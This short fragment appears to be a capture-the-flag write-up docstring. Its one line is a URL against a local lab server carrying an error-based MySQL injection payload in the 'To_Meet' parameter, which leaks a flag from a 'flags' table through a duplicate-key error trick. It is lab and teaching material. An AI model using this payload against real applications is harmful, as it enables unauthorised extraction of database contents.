...
"""
Write up:
    - http://127.0.0.1:8083/?To_Meet=' or (select 1 from (select count(*), concat((select(select concat(flag, 0x7e)) from flags limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--%20(注意最後面有一個空格)
"""
